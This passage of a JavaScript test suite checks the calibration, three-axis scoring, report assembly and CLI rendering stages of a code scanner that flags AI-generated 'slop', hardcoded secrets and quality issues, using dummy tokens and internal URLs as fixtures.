assert(l12BigResult.entropyMedian === 0.55, 'L12 big project: entropyMedian = 0.55');
// All findings are within 1 MAD of median (MAD=0 since all identical),
// so they should all be downgraded from MEDIUM → UNCERTAIN
var l12Downgraded = l12BigReg.filter(function (e) {
  return e.findings[0].confidence === 'UNCERTAIN';
});
assert(l12Downgraded.length === 110, 'L12 big project: all uniform MEDIUM findings downgraded to UNCERTAIN');

// --- Small project: no recalibration of findings ---
var l12SmallReg = [];
for (var l12s = 0; l12s < 5; l12s++) {
  l12SmallReg.push({
    findings: [{ value: 'test', pipelineScore: 0.55, confidence: 'MEDIUM', lineIndex: 0 }],
    compression: { selfRatio: 0.30 },
    patternHits: [],
  });
}
L12.calibrate(l12SmallReg);
var l12NotDowngraded = l12SmallReg.filter(function (e) {
  return e.findings[0].confidence === 'MEDIUM';
});
assert(l12NotDowngraded.length === 5, 'L12 small project: findings NOT downgraded (selfWeight = 0)');

// --- Compression recalibration: within-range files get outlierScore zeroed ---
var l12CompReg = [];
for (var l12c = 0; l12c < 50; l12c++) {
  l12CompReg.push({
    findings: [],
    compression: { selfRatio: 0.30, projectOutlierScore: 25 },
    patternHits: [],
  });
}
// Add one outlier
l12CompReg.push({
  findings: [],
  compression: { selfRatio: 0.05, projectOutlierScore: 80 },
  patternHits: [],
});
L12.calibrate(l12CompReg);
// The first 50 (uniform) should have outlierScore zeroed
assert(l12CompReg[0].compression.projectOutlierScore === 0, 'L12 compression: within-range file gets outlierScore zeroed');
// The outlier (0.05) should keep its score
assert(l12CompReg[50].compression.projectOutlierScore === 80, 'L12 compression: outlier file keeps its outlierScore');

// --- Output shape ---
assert(typeof l12BigResult.entropyMAD === 'number', 'L12 output: has entropyMAD');
assert(typeof l12BigResult.entropyMedian === 'number', 'L12 output: has entropyMedian');
assert(typeof l12BigResult.compressionBaseline === 'number', 'L12 output: has compressionBaseline');
assert(typeof l12BigResult.compressionMAD === 'number', 'L12 output: has compressionMAD');
assert(typeof l12BigResult.selfCalibrationWeight === 'number', 'L12 output: has selfCalibrationWeight');
assert(typeof l12BigResult.confidenceMultipliers === 'object', 'L12 output: has confidenceMultipliers');

// --- L13 Scoring Engine ---
section('L13 — Three-axis scoring');

var L13 = require('../src/pipeline/L13-scoring.js');

// --- Clamp ---
assert(L13._clamp(-5) === 0, 'L13 _clamp: negative → 0');
assert(L13._clamp(150) === 100, 'L13 _clamp: >100 → 100');
assert(L13._clamp(42.456) === 42.5, 'L13 _clamp: rounds to 1 decimal');

// --- Role weight ---
assert(L13._roleWeight({ territory: 'vendor' }) === 0.1, 'L13 roleWeight: vendor → 0.1');
assert(L13._roleWeight({ territory: 'test' }) === 0.5, 'L13 roleWeight: test → 0.5');
assert(L13._roleWeight({ territory: 'application' }) === 1.0, 'L13 roleWeight: application → 1.0');
assert(L13._roleWeight({}) === 1.0, 'L13 roleWeight: missing → 1.0');

// --- Empty registry ---
var l13Empty = L13.computeAxes([]);
assert(l13Empty.axes.A === 0 && l13Empty.axes.B === 0 && l13Empty.axes.C === 0, 'L13 empty: all axes 0');
assert(l13Empty.perFile.length === 0, 'L13 empty: no per-file');
assert(l13Empty.project.fileCount === 0, 'L13 empty: project fileCount 0');

// --- Pattern hits contribute to Axis A ---
var l13SlopReg = [{
  relativePath: 'src/sloppy.js',
  path: '/tmp/src/sloppy.js',
  size: 500,
  territory: 'application',
  surface: { avgLineLength: 50 },
  compression: { compressionScore: 0, selfRatio: 0.4 },
  findings: [],
  review: [],
  urlFindings: [],
  patternHits: [
    { ruleId: 'scaffold-todo', ruleName: 'Scaffold TODO', category: 'scaffold-residue', severity: 7, line: '// TODO: implement', lineIndex: 0, fix: 'Remove scaffold TODOs' },
    { ruleId: 'clone-dup', ruleName: 'Clone dup', category: 'clone-pollution', severity: 8, line: 'function handleSubmit()', lineIndex: 5, fix: 'Remove duplicate' },
    { ruleId: 'verbose-null', ruleName: 'Verbose null', category: 'verbosity', severity: 3, line: 'if (x !== null)', lineIndex: 10, fix: 'Simplify' },
  ],
}];
var l13SlopResult = L13.computeAxes(l13SlopReg);
assert(l13SlopResult.axes.A > 0, 'L13 slop patterns: Axis A > 0 (got ' + l13SlopResult.axes.A + ')');
assert(l13SlopResult.perFile.length === 1, 'L13 slop patterns: 1 per-file entry');
assert(l13SlopResult.perFile[0].axes.A > 0, 'L13 slop patterns: per-file Axis A > 0');
assert(l13SlopResult.perFile[0].breakdown.A.patterns > 0, 'L13 slop patterns: breakdown shows pattern contribution');

// --- Security findings contribute to Axis B ---
var l13SecReg = [{
  relativePath: 'src/api.js',
  path: '/tmp/src/api.js',
  size: 300,
  territory: 'application',
  surface: { avgLineLength: 30 },
  compression: { compressionScore: 0, selfRatio: 0.4 },
  findings: [
    { value: 'ghp_1234abcdef567890', confidence: 'HIGH', pipelineScore: 0.85, signalCount: 3 },
  ],
  review: [],
  urlFindings: [
    { url: 'http://10.0.0.1/admin', classification: 'internal-exposed', internal: true, sensitivePath: true, queryFindings: [], lineIndex: 5 },
  ],
  patternHits: [
    { ruleId: 'hardcoded-secret', ruleName: 'Hardcoded secret', category: 'security', severity: 9, line: 'const key = "ghp_..."', lineIndex: 2, fix: 'Use env vars' },
  ],
}];
var l13SecResult = L13.computeAxes(l13SecReg);
assert(l13SecResult.axes.B > 0, 'L13 security: Axis B > 0 (got ' + l13SecResult.axes.B + ')');
assert(l13SecResult.perFile[0].breakdown.B.findings > 0, 'L13 security: findings contribute to Axis B');
assert(l13SecResult.perFile[0].breakdown.B.urls > 0, 'L13 security: URLs contribute to Axis B');

// --- Quality patterns contribute to Axis C ---
var l13QualReg = [{
  relativePath: 'src/handler.js',
  path: '/tmp/src/handler.js',
  size: 400,
  territory: 'application',
  surface: { avgLineLength: 40 },
  compression: { compressionScore: 0, selfRatio: 0.4 },
  findings: [],
  review: [],
  urlFindings: [],
  patternHits: [
    { ruleId: 'empty-catch', ruleName: 'Empty catch', category: 'error-handling', severity: 8, line: 'catch(e) {}', lineIndex: 3, fix: 'Handle the error' },
    { ruleId: 'async-no-await', ruleName: 'Async no await', category: 'async-abuse', severity: 6, line: 'async function foo() { return 1; }', lineIndex: 8, fix: 'Remove async' },
  ],
}];
var l13QualResult = L13.computeAxes(l13QualReg);
assert(l13QualResult.axes.C > 0, 'L13 quality: Axis C > 0 (got ' + l13QualResult.axes.C + ')');
assert(l13QualResult.perFile[0].breakdown.C.patterns > 0, 'L13 quality: patterns contribute to Axis C');

// --- Axes are independent: security-heavy file should have B > A, C ---
assert(l13SecResult.axes.B > l13SecResult.axes.A || l13SecResult.axes.B > l13SecResult.axes.C,
  'L13 independence: security file has Axis B dominating');

// --- Clean file → all axes near 0 ---
var l13CleanReg = [{
  relativePath: 'src/clean.js',
  path: '/tmp/src/clean.js',
  size: 200,
  territory: 'application',
  surface: { avgLineLength: 40 },
  compression: { compressionScore: 0, selfRatio: 0.5 },
  findings: [],
  review: [],
  urlFindings: [],
  patternHits: [],
}];
var l13CleanResult = L13.computeAxes(l13CleanReg);
assert(l13CleanResult.axes.A === 0 && l13CleanResult.axes.B === 0 && l13CleanResult.axes.C === 0,
  'L13 clean file: all axes 0');

// --- Compression contributes to Axis A ---
var l13CompReg = [{
  relativePath: 'src/generated.js',
  path: '/tmp/src/generated.js',
  size: 1000,
  territory: 'application',
  surface: { avgLineLength: 50 },
  compression: { compressionScore: 80, selfRatio: 0.15 },
  findings: [],
  review: [],
  urlFindings: [],
  patternHits: [],
}];
var l13CompResult = L13.computeAxes(l13CompReg);
assert(l13CompResult.axes.A > 0, 'L13 compression: high compressionScore raises Axis A (got ' + l13CompResult.axes.A + ')');

// --- Project aggregation: vendor files weigh less ---
var l13MixedReg = [
  {
    relativePath: 'src/app.js', path: '/tmp/src/app.js', size: 500, territory: 'application',
    surface: { avgLineLength: 50 }, compression: { compressionScore: 60, selfRatio: 0.2 },
    findings: [], review: [], urlFindings: [], patternHits: [],
  },
  {
    relativePath: 'vendor/lib.js', path: '/tmp/vendor/lib.js', size: 500, territory: 'vendor',
    surface: { avgLineLength: 50 }, compression: { compressionScore: 80, selfRatio: 0.1 },
    findings: [], review: [], urlFindings: [], patternHits: [],
  },
];
var l13MixedResult = L13.computeAxes(l13MixedReg);
// Application file (weight 1.0) should dominate over vendor (weight 0.1)
assert(l13MixedResult.project.axes.A < 30, 'L13 project: vendor file weighted down in aggregate');

// --- Calibration multipliers reduce pattern scores ---
var l13CalibReg = [{
  relativePath: 'src/wordy.js', path: '/tmp/src/wordy.js', size: 500, territory: 'application',
  surface: { avgLineLength: 50 }, compression: { compressionScore: 0, selfRatio: 0.4 },
  findings: [], review: [], urlFindings: [],
  patternHits: [
    { ruleId: 'verbose-1', ruleName: 'Verbose 1', category: 'verbosity', severity: 5, line: '...', lineIndex: 0, fix: 'x' },
    { ruleId: 'verbose-2', ruleName: 'Verbose 2', category: 'verbosity', severity: 5, line: '...', lineIndex: 1, fix: 'x' },
  ],
}];
var l13NoCal = L13.computeAxes(l13CalibReg);
var l13WithCal = L13.computeAxes(l13CalibReg, { confidenceMultipliers: { verbosity: 0.5 } });
assert(l13WithCal.axes.A < l13NoCal.axes.A, 'L13 calibration: multiplier 0.5 reduces Axis A');

// --- L14 Report Assembly ---
section('L14 — Report assembly');

var L14 = require('../src/pipeline/L14-report.js');

// --- Verdicts ---
assert(L14._verdict(0) === 'Clean', 'L14 verdict: 0 → Clean');
assert(L14._verdict(5) === 'Minimal', 'L14 verdict: 5 → Minimal');
assert(L14._verdict(15) === 'Some issues', 'L14 verdict: 15 → Some issues');
assert(L14._verdict(40) === 'Concerning', 'L14 verdict: 40 → Concerning');
assert(L14._verdict(60) === 'Heavy', 'L14 verdict: 60 → Heavy');
assert(L14._verdict(90) === 'Critical', 'L14 verdict: 90 → Critical');

// --- Mask value ---
assert(L14._maskValue('ghp_1234567890abcdef') === 'ghp_**************ef', 'L14 mask: long value masked');
assert(L14._maskValue('short') === '********', 'L14 mask: short value fully masked');
assert(L14._maskValue('') === '********', 'L14 mask: empty string');

// --- Empty report ---
var l14EmptyScoring = { axes: { A: 0, B: 0, C: 0 }, perFile: [], project: { axes: { A: 0, B: 0, C: 0 }, fileCount: 0, totalLines: 0 } };
var l14EmptyReport = L14.assembleReport(l14EmptyScoring, []);
assert(l14EmptyReport.secrets.length === 0, 'L14 empty: no secrets');
assert(l14EmptyReport.exposure.length === 0, 'L14 empty: no exposure');
assert(l14EmptyReport.patternHits.length === 0, 'L14 empty: no pattern hits');
assert(l14EmptyReport.review.length === 0, 'L14 empty: no review items');
assert(l14EmptyReport.slopBreakdown.length === 0, 'L14 empty: no slop breakdown');
assert(l14EmptyReport.cleanFiles.length === 0, 'L14 empty: no clean files');

// --- Full report with mixed data ---
var l14Registry = [
  {
    relativePath: 'src/api.js', path: '/tmp/src/api.js',
    findings: [
      { value: 'sk-proj-abcdefgh12345678', confidence: 'HIGH', pipelineScore: 0.9, signalCount: 4, lineIndex: 10 },
    ],
    review: [
      { value: 'maybe-a-secret-maybe-not', confidence: 'UNCERTAIN', pipelineScore: 0.35, signalCount: 1, lineIndex: 20 },
    ],
    urlFindings: [
      { url: 'http://192.168.1.1/admin', classification: 'internal-exposed', internal: true, sensitivePath: true, queryFindings: [], lineIndex: 5 },
    ],
    patternHits: [
      { ruleId: 'hardcoded-secret', ruleName: 'Hardcoded secret', category: 'security', severity: 9, line: 'const key = "sk-..."', lineIndex: 10, fix: 'Use env vars' },
      { ruleId: 'empty-catch', ruleName: 'Empty catch', category: 'error-handling', severity: 8, line: 'catch(e) {}', lineIndex: 30, fix: 'Handle error' },
    ],
  },
  {
    relativePath: 'src/clean.js', path: '/tmp/src/clean.js',
    findings: [],
    review: [],
    urlFindings: [],
    patternHits: [],
  },
];
var l14Scoring = {
  axes: { A: 20, B: 45, C: 15 },
  perFile: [
    { path: 'src/api.js', axes: { A: 40, B: 90, C: 30 }, breakdown: {}, lineCount: 50, roleWeight: 1.0 },
    { path: 'src/clean.js', axes: { A: 0, B: 0, C: 0 }, breakdown: {}, lineCount: 50, roleWeight: 1.0 },
  ],
  project: { axes: { A: 20, B: 45, C: 15 }, totalLines: 100, fileCount: 2 },
};
var l14Report = L14.assembleReport(l14Scoring, l14Registry);

// Secrets
assert(l14Report.secrets.length === 1, 'L14 report: 1 secret found');
assert(l14Report.secrets[0].file === 'src/api.js', 'L14 report: secret in correct file');
assert(l14Report.secrets[0].value.indexOf('****') !== -1, 'L14 report: secret value is masked');

// Exposure
assert(l14Report.exposure.length === 1, 'L14 report: 1 exposure item');
assert(l14Report.exposure[0].classification === 'internal-exposed', 'L14 report: correct classification');

// Pattern hits
assert(l14Report.patternHits.length === 2, 'L14 report: 2 pattern hits');
assert(l14Report.patternHits[0].file === 'src/api.js', 'L14 report: hit has file');
assert(typeof l14Report.patternHits[0].fix === 'string', 'L14 report: hit has fix');

// Slop breakdown
assert(l14Report.slopBreakdown.length === 2, 'L14 report: 2 categories in breakdown');
assert(l14Report.slopBreakdown[0].hitCount >= 1, 'L14 report: breakdown has hit count');

// Clean files
assert(l14Report.cleanFiles.length === 1, 'L14 report: 1 clean file');
assert(l14Report.cleanFiles[0].file === 'src/clean.js', 'L14 report: clean file is correct');

// Review bucket — UNCERTAIN findings go here, not in secrets
assert(l14Report.review.length === 1, 'L14 report: 1 review item');
assert(l14Report.review[0].file === 'src/api.js', 'L14 report: review item has file');

// Project summary
assert(l14Report.projectSummary.fileCount === 2, 'L14 report: projectSummary has fileCount');
assert(typeof l14Report.projectSummary.verdicts.A === 'string', 'L14 report: has verdict for Axis A');
assert(typeof l14Report.projectSummary.verdicts.B === 'string', 'L14 report: has verdict for Axis B');
assert(typeof l14Report.projectSummary.verdicts.C === 'string', 'L14 report: has verdict for Axis C');
assert(l14Report.projectSummary.verdicts.B === 'Concerning', 'L14 report: Axis B verdict is Concerning (45)');

// Per-file passthrough
assert(l14Report.perFile.length === 2, 'L14 report: perFile passed through');

// --- UNCERTAIN never appears in secrets ---
var l14SecretConfidences = l14Report.secrets.map(function (s) { return s.confidence; });
assert(l14SecretConfidences.indexOf('UNCERTAIN') === -1, 'L14 report: no UNCERTAIN in secrets');

// --- Correlation data in project summary ---
var l14CorrelatedReport = L14.assembleReport(l14Scoring, l14Registry, { duplicateSecrets: [{ value: 'x', fileCount: 2 }] });
assert(l14CorrelatedReport.projectSummary.correlation !== null, 'L14 report: correlation data in project summary');
assert(l14CorrelatedReport.projectSummary.correlation.duplicateSecrets.length === 1, 'L14 report: correlation has duplicateSecrets');

// --- Safe-external URLs excluded from exposure ---
var l14SafeReg = [{
  relativePath: 'src/config.js', path: '/tmp/src/config.js',
  findings: [], review: [],
  urlFindings: [
    { url: 'https://api.github.com/repos', classification: 'safe-external', internal: false, queryFindings: [], lineIndex: 1 },
  ],
  patternHits: [],
}];
var l14SafeReport = L14.assembleReport(l14EmptyScoring, l14SafeReg);
assert(l14SafeReport.exposure.length === 0, 'L14 report: safe-external URLs excluded from exposure');

// --- L15 Output Formatting ---
section('L15 — Output formatting');

var L15 = require('../src/pipeline/L15-output.js');

// --- Axis filter parsing ---
assert(L15._parseAxisFilter(null) === null, 'L15 parseAxisFilter: null → null');
assert(L15._parseAxisFilter('') === null, 'L15 parseAxisFilter: empty → null');
var l15Filter = L15._parseAxisFilter('A,C');
assert(l15Filter.A === true && l15Filter.C === true && !l15Filter.B, 'L15 parseAxisFilter: A,C');
var l15FilterLower = L15._parseAxisFilter('a,b');
assert(l15FilterLower.A === true && l15FilterLower.B === true, 'L15 parseAxisFilter: case insensitive');

// --- Threshold parsing ---
var l15DefThresh = L15._parseThresholds(null);
assert(l15DefThresh.A === 50 && l15DefThresh.B === 25 && l15DefThresh.C === 100, 'L15 parseThresholds: defaults');
var l15CustomThresh = L15._parseThresholds('A:30,B:15');
assert(l15CustomThresh.A === 30, 'L15 parseThresholds: A overridden to 30');
assert(l15CustomThresh.B === 15, 'L15 parseThresholds: B overridden to 15');
assert(l15CustomThresh.C === 100, 'L15 parseThresholds: C unchanged at 100');

// --- Exit code ---
assert(L15.exitCode({ A: 0, B: 0, C: 0 }) === 0, 'L15 exitCode: all zero → 0');
assert(L15.exitCode({ A: 51, B: 0, C: 0 }) === 1, 'L15 exitCode: A > 50 → 1');
assert(L15.exitCode({ A: 0, B: 26, C: 0 }) === 1, 'L15 exitCode: B > 25 → 1');
assert(L15.exitCode({ A: 0, B: 0, C: 99 }) === 0, 'L15 exitCode: C < 100 → 0');
assert(L15.exitCode({ A: 40, B: 20, C: 50 }) === 0, 'L15 exitCode: all within defaults → 0');
assert(L15.exitCode({ A: 40, B: 20, C: 50 }, { A: 30, B: 10, C: 40 }) === 1, 'L15 exitCode: custom thresholds → 1');
assert(L15.exitCode({ A: 10, B: 5, C: 10 }, { A: 30, B: 10, C: 40 }) === 0, 'L15 exitCode: custom thresholds → 0');

// --- Roast lookup (removed in v2 redesign) ---
// Roasts no longer exist; replaced with clean instrument-panel output

// --- renderJson ---
var l15TestReport = { projectSummary: { axes: { A: 10, B: 5, C: 3 } }, secrets: [], patternHits: [] };
var l15Json = L15.renderJson(l15TestReport);
var l15Parsed = JSON.parse(l15Json);
assert(l15Parsed.projectSummary.axes.A === 10, 'L15 renderJson: valid JSON with correct data');

// --- renderCli ---
var l15CliReport = {
  projectSummary: {
    axes: { A: 30, B: 10, C: 5 },
    verdicts: { A: 'Some issues', B: 'Minimal', C: 'Minimal' },
    fileCount: 3,
    totalLines: 150,
  },
  perFile: [
    { path: 'src/a.js', axes: { A: 60, B: 20, C: 10 }, breakdown: {}, lineCount: 50, roleWeight: 1.0 },
    { path: 'src/b.js', axes: { A: 0, B: 0, C: 0 }, breakdown: {}, lineCount: 50, roleWeight: 1.0 },
  ],
  secrets: [
    { value: 'sk-p****xy', file: 'src/a.js', line: 5, confidence: 'HIGH', signals: 3 },
  ],
  exposure: [
    { url: 'http://10.0.0.1/admin', classification: 'internal-exposed', file: 'src/a.js', line: 10 },
  ],
  patternHits: [
    { ruleId: 'empty-catch', ruleName: 'Empty catch', category: 'error-handling', severity: 8, file: 'src/a.js', line: 3, source: 'catch(e) {}', fix: 'Handle error' },
  ],
  slopBreakdown: [
    { category: 'error-handling', hitCount: 1, fileCount: 1, topSeverity: 8 },
  ],
  review: [
    { value: 'high****re', file: 'src/a.js', line: 20, pipelineScore: 0.60, signals: 2 },
    { value: 'mayb****et', file: 'src/a.js', line: 25, pipelineScore: 0.45, signals: 1 },
    { value: 'nois****se', file: 'src/a.js', line: 30, pipelineScore: 0.20, signals: 1 },
  ],
  cleanFiles: [{ file: 'src/b.js', axes: { A: 0, B: 0, C: 0 } }],
};

var l15CliOutput = L15.renderCli(l15CliReport, { verbose: true, targetPath: '/tmp/project', thresholds: L15.DEFAULT_THRESHOLDS });
assert(typeof l15CliOutput === 'string', 'L15 renderCli: returns string');
assert(l15CliOutput.indexOf('AI SLOP') !== -1, 'L15 renderCli: contains AI SLOP axis');
assert(l15CliOutput.indexOf('SECURITY') !== -1, 'L15 renderCli: contains SECURITY axis');
assert(l15CliOutput.indexOf('QUALITY') !== -1, 'L15 renderCli: contains QUALITY axis');
assert(l15CliOutput.indexOf('src/a.js') !== -1, 'L15 renderCli: contains file path');
assert(l15CliOutput.indexOf('SECRETS') !== -1, 'L15 renderCli: contains secrets section');
assert(l15CliOutput.indexOf('EXPOSURE') !== -1, 'L15 renderCli: contains exposure section');
assert(l15CliOutput.indexOf('PATTERN HITS') !== -1, 'L15 renderCli: contains pattern hits (verbose)');
assert(l15CliOutput.indexOf('SLOP BREAKDOWN') !== -1, 'L15 renderCli: contains slop breakdown (verbose)');
assert(l15CliOutput.indexOf('REVIEW') !== -1, 'L15 renderCli: contains review section');

// --- renderCli with axis filter ---
var l15FilteredOutput = L15.renderCli(l15CliReport, { axis: 'B', thresholds: L15.DEFAULT_THRESHOLDS });
assert(l15FilteredOutput.indexOf('SECURITY') !== -1, 'L15 renderCli filtered: contains SECURITY');
assert(l15FilteredOutput.indexOf('AI SLOP') === -1, 'L15 renderCli filtered: excludes AI SLOP');

// --- renderBanner (now returns empty — exit info is inline) ---
var l15PassBanner = L15.renderBanner(0, { A: 10, B: 5, C: 3 }, L15.DEFAULT_THRESHOLDS);
assert(l15PassBanner === '', 'L15 renderBanner: returns empty string');
var l15FailBanner = L15.renderBanner(1, { A: 60, B: 30, C: 5 }, L15.DEFAULT_THRESHOLDS);
assert(l15FailBanner === '', 'L15 renderBanner: fail also returns empty string');

// --- Review triage split ---
section('L15 — Review triage split');

// Build review items across all three tiers
var triageReview = [
  { value: 'aaa', file: 'f.js', line: 1, pipelineScore: 0.70, signals: 2, shape: 'mixed', valueLength: 20 },
  { value: 'bbb', file: 'f.js', line: 2, pipelineScore: 0.55, signals: 2, shape: 'hex-shaped', valueLength: 32 },
  { value: 'ccc', file: 'f.js', line: 3, pipelineScore: 0.50, signals: 1, shape: 'mixed', valueLength: 12 },
  { value: 'ddd', file: 'f.js', line: 4, pipelineScore: 0.40, signals: 1, shape: 'mixed', valueLength: 10 },
  { value: 'eee', file: 'f.js', line: 5, pipelineScore: 0.30, signals: 1, shape: 'mixed', valueLength: 8 },
  { value: 'fff', file: 'f.js', line: 6, pipelineScore: 0.10, signals: 0, shape: 'mixed', valueLength: 6 },
];

// Default mode (no verbose): only Tier 1 visible, hidden summary present
var triageReport = {
  projectSummary: { axes: { A: 5, B: 5, C: 5 }, verdicts: { A: 'Minimal', B: 'Minimal', C: 'Minimal' }, fileCount: 1, totalLines: 100 },
  perFile: [{ path: 'f.js', axes: { A: 5, B: 5, C: 5 }, breakdown: {}, lineCount: 100, roleWeight: 1 }],
  secrets: [], exposure: [], patternHits: [], slopBreakdown: [], cleanFiles: [],
  review: triageReview,
};

var triageDefault = L15.renderCli(triageReport, { targetPath: '/tmp/test' });
// Default shows only Tier 1 items (score >= 0.55): lines 1 and 2 (displayed as L2, L3)
assert(triageDefault.indexOf('score=0.70') !== -1, 'triage default: shows Tier 1 item (score 0.70)');
assert(triageDefault.indexOf('score=0.55') !== -1, 'triage default: shows Tier 1 item (score 0.55)');
// Default hides Tier 2 + Tier 3
assert(triageDefault.indexOf('low-confidence') !== -1, 'triage default: shows hidden count summary');
assert(triageDefault.indexOf('4 low-confidence') !== -1, 'triage default: hidden count is 4');
// Tier 3 items should not be individually visible
assert(triageDefault.indexOf('score=0.10') === -1, 'triage default: Tier 3 item not shown');
assert(triageDefault.indexOf('score=0.30') === -1, 'triage default: Tier 3 item (0.30) not shown');

// Verbose mode: Tier 1 + Tier 2 visible, Tier 3 suppressed
var triageVerbose = L15.renderCli(triageReport, { verbose: true, targetPath: '/tmp/test' });
assert(triageVerbose.indexOf('worth a look') !== -1, 'triage verbose: shows Tier 1 header');
assert(triageVerbose.indexOf('probably fine') !== -1, 'triage verbose: shows Tier 2 header');
assert(triageVerbose.indexOf('score=0.70') !== -1, 'triage verbose: Tier 1 item visible');
assert(triageVerbose.indexOf('score=0.50') !== -1, 'triage verbose: Tier 2 item visible');
assert(triageVerbose.indexOf('score=0.40') !== -1, 'triage verbose: Tier 2 item 0.40 visible');
assert(triageVerbose.indexOf('mathematical artifact') !== -1, 'triage verbose: shows Tier 3 suppressed count');
assert(triageVerbose.indexOf('2 mathematical artifact') !== -1, 'triage verbose: Tier 3 count is 2');
// Tier 3 individual items hidden even in verbose
assert(triageVerbose.indexOf('score=0.10') === -1, 'triage verbose: Tier 3 item (0.10) not shown');
assert(triageVerbose.indexOf('score=0.30') === -1, 'triage verbose: Tier 3 item (0.30) not shown');

// Dedup: duplicate line+value items should collapse
var triageDup = [
  { value: 'aaa', file: 'f.js', line: 1, pipelineScore: 0.70, signals: 2, shape: 'mixed', valueLength: 20 },
  { value: 'aaa', file: 'f.js', line: 1, pipelineScore: 0.70, signals: 2, shape: 'mixed', valueLength: 20 },
  { value: 'bbb', file: 'f.js', line: 2, pipelineScore: 0.60, signals: 1, shape: 'mixed', valueLength: 16 },
];
var triageDupReport = {
  projectSummary: { axes: { A: 5, B: 5, C: 5 }, verdicts: { A: 'Minimal', B: 'Minimal', C: 'Minimal' }, fileCount: 1, totalLines: 50 },
  perFile: [{ path: 'f.js', axes: { A: 5, B: 5, C: 5 }, breakdown: {}, lineCount: 50, roleWeight: 1 }],
  secrets: [], exposure: [], patternHits: [], slopBreakdown: [], cleanFiles: [],
  review: triageDup,
};
var triageDupOut = L15.renderCli(triageDupReport, { targetPath: '/tmp/test' });
// Header should show 2 (deduped), not 3
assert(triageDupOut.indexOf('2 uncertain') !== -1, 'triage dedup: header shows 2 after dedup');

// Empty review: no REVIEW section rendered
var triageEmpty = []; 
var triageEmptyReport = {
  projectSummary: { axes: { A: 0, B: 0, C: 0 }, verdicts: { A: 'Clean', B: 'Clean', C: 'Clean' }, fileCount: 1, totalLines: 50 },
  perFile: [{ path: 'f.js', axes: { A: 0, B: 0, C: 0 }, breakdown: {}, lineCount: 50, roleWeight: 1 }],
  secrets: [], exposure: [], patternHits: [], slopBreakdown: [], cleanFiles: [],
  review: triageEmpty,
};
var triageEmptyOut = L15.renderCli(triageEmptyReport, { targetPath: '/tmp/test' });
assert(triageEmptyOut.indexOf('REVIEW') === -1, 'triage empty: no REVIEW section when empty');

// All items below Tier 1: default shows 0 count + hidden summary
var triageAllLow = [
  { value: 'xxx', file: 'f.js', line: 1, pipelineScore: 0.42, signals: 1, shape: 'mixed', valueLength: 10 },
  { value: 'yyy', file: 'f.js', line: 2, pipelineScore: 0.20, signals: 0, shape: 'mixed', valueLength: 8 },
];
var triageAllLowReport = {
  projectSummary: { axes: { A: 0, B: 5, C: 0 }, verdicts: { A: 'Clean', B: 'Minimal', C: 'Clean' }, fileCount: 1, totalLines: 50 },
  perFile: [{ path: 'f.js', axes: { A: 0, B: 5, C: 0 }, breakdown: {}, lineCount: 50, roleWeight: 1 }],
  secrets: [], exposure: [], patternHits: [], slopBreakdown: [], cleanFiles: [],
  review: triageAllLow,
};
var triageAllLowOut = L15.renderCli(triageAllLowReport, { targetPath: '/tmp/test' });
assert(triageAllLowOut.indexOf('0 uncertain') !== -1, 'triage all-low default: header shows 0');
assert(triageAllLowOut.indexOf('2 low-confidence') !== -1, 'triage all-low default: 2 items hidden');

// --- Pattern hits visual redesign ---
section('L15 — Pattern hits visual');

// Build test fixture with multiple categories and severities
var phVisReport = {
  projectSummary: {
    axes: { A: 30, B: 15, C: 10 },
    verdicts: { A: 'Some issues', B: 'Minimal', C: 'Minimal' },
    fileCount: 1,
    totalLines: 80,
  },
  perFile: [{ path: 'demo.js', axes: { A: 30, B: 15, C: 10 }, breakdown: {}, lineCount: 80, roleWeight: 1 }],
  secrets: [], exposure: [], review: [], slopBreakdown: [], cleanFiles: [],
  patternHits: [
    { ruleId: 'empty-catch', ruleName: 'Empty catch', category: 'error-handling', severity: 8, file: 'demo.js', lineNumber: 5, source: 'catch(e) {}', fix: 'Handle error' },
    { ruleId: 'console-log', ruleName: 'Console log', category: 'debug-pollution', severity: 5, file: 'demo.js', lineNumber: 11, source: 'console.log("debug")', fix: 'Remove debug log' },
    { ruleId: 'dead-require', ruleName: 'Dead require', category: 'dead-code', severity: 4, file: 'demo.js', lineNumber: 2, source: "const x = require('unused')", fix: 'Remove unused import' },
    { ruleId: 'hardcoded-secret', ruleName: 'Hardcoded secret', category: 'security', severity: 9, file: 'demo.js', lineNumber: 21, source: "const key = 'sk-abc123...'", fix: 'Use env variable' },
    { ruleId: 'todo-comment', ruleName: 'TODO comment', category: 'debug-pollution', severity: 3, file: 'demo.js', lineNumber: 31, source: '// TODO: fix later', fix: 'Resolve or track in issue' },
  ],
};

var phVisOut = L15.renderCli(phVisReport, { verbose: true, targetPath: '/tmp/test', thresholds: L15.DEFAULT_THRESHOLDS });

// Header present
assert(phVisOut.indexOf('PATTERN HITS') !== -1, 'ph-visual: header present');
assert(phVisOut.indexOf('(5)') !== -1, 'ph-visual: shows hit count');

// Category group labels present (grouped by first-occurrence order)
assert(phVisOut.indexOf('error-handling') !== -1, 'ph-visual: error-handling group');
assert(phVisOut.indexOf('debug-pollution') !== -1, 'ph-visual: debug-pollution group');
assert(phVisOut.indexOf('dead-code') !== -1, 'ph-visual: dead-code group');
assert(phVisOut.indexOf('security') !== -1, 'ph-visual: security group');

// Severity-coloured line numbers (check lineTag format)
assert(phVisOut.indexOf('L5') !== -1, 'ph-visual: L5 (line 4+1) for empty-catch');
assert(phVisOut.indexOf('L11') !== -1, 'ph-visual: L11 for console-log');
assert(phVisOut.indexOf('L21') !== -1, 'ph-visual: L21 for hardcoded-secret');

// Rule badges present
assert(phVisOut.indexOf('[empty-catch]') !== -1, 'ph-visual: empty-catch badge');
assert(phVisOut.indexOf('[console-log]') !== -1, 'ph-visual: console-log badge');
assert(phVisOut.indexOf('[hardcoded-secret]') !== -1, 'ph-visual: hardcoded-secret badge');

// Fix suggestions present (→ arrow)
assert(phVisOut.indexOf('\u2192') !== -1, 'ph-visual: fix arrow present');
assert(phVisOut.indexOf('Handle error') !== -1, 'ph-visual: fix text for empty-catch');
assert(phVisOut.indexOf('Use env variable') !== -1, 'ph-visual: fix text for hardcoded-secret');

// Source snippets present
assert(phVisOut.indexOf('catch') !== -1, 'ph-visual: source snippet for empty-catch');
assert(phVisOut.indexOf('console') !== -1, 'ph-visual: source snippet for console-log');

// Group separator (─ dashes)
assert(phVisOut.indexOf('\u2500\u2500') !== -1, 'ph-visual: category separator dashes');

// fileFilter in multi-file mode narrows results
var phVisFilterReport = {
  projectSummary: {
    axes: { A: 30, B: 15, C: 10 },
    verdicts: { A: 'Some issues', B: 'Minimal', C: 'Minimal' },
    fileCount: 2,
    totalLines: 160,
  },
  perFile: [
